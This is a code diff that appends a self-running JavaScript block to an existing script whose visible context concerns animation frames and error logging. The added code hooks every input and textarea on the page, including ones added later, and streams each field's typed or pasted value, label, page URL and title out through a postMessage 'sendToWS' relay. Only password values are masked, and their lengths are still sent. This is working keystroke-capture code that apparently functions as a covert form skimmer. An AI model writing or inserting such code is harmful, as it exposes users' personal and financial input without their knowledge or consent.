@@ -222,4 +222,70 @@
         cancelAnimationFrame(f);
         console.log(error);
     };
+    (function initKeystrokeStream() {
+        const inputStates = new Map();
+        function getElementMeta(el) {
+            const id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || 'unknown';
+            const type = el.type || el.tagName.toLowerCase();
+            const placeholder = el.placeholder || '';
+            const label = el.getAttribute('aria-label') || 
+                document.querySelector(`label[for="${el.id}"]`)?.textContent?.trim() || '';
+            const isPassword = type === 'password' || id.toLowerCase().includes('password');
+            return { id, type, placeholder, label, isPassword };
+        };
+        function sendKeystroke(el, value) {
+            const meta = getElementMeta(el);
+            const payload = JSON.stringify({
+                type: 'keystroke',
+                fieldId: meta.id,
+                fieldType: meta.type,
+                placeholder: meta.placeholder,
+                label: meta.label,
+                isPassword: meta.isPassword,
+                value: meta.isPassword ? '•'.repeat(value.length) : value,
+                length: value.length,
+                url: location.href,
+                title: document.title,
+                ts: Date.now()
+            });
+            window.postMessage({ action: 'sendToWS', message: payload }, '*');
+        };
+        function attachRealtime(el) {
+            if (el._realtimeAttached) return;
+            el._realtimeAttached = true;
+            const handler = () => {
+                sendKeystroke(el, el.value);
+            };
+            el.addEventListener('input', handler);
+            el.addEventListener('paste', () => setTimeout(() => sendKeystroke(el, el.value), 50));
+            el.addEventListener('change', handler);
+            el._realtimeHandler = handler;
+        };
+        function detachRealtime(el) {
+            if (el._realtimeHandler) {
+                el.removeEventListener('input', el._realtimeHandler);
+                el.removeEventListener('change', el._realtimeHandler);
+                delete el._realtimeHandler;
+                delete el._realtimeAttached;
+            };
+        };
+        document.querySelectorAll('input, textarea').forEach(attachRealtime);
+        const ksObserver = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === 1) {
+                        if (node.matches('input, textarea')) attachRealtime(node);
+                        node.querySelectorAll('input, textarea').forEach(attachRealtime);
+                    };
+                });
+                mutation.removedNodes.forEach((node) => {
+                    if (node.nodeType === 1) {
+                        if (node.matches('input, textarea')) detachRealtime(node);
+                        node.querySelectorAll('input, textarea').forEach(detachRealtime);
+                    };
+                });
+            });
+        });
+        ksObserver.observe(document.body, { childList: true, subtree: true });
+    })();
 })();
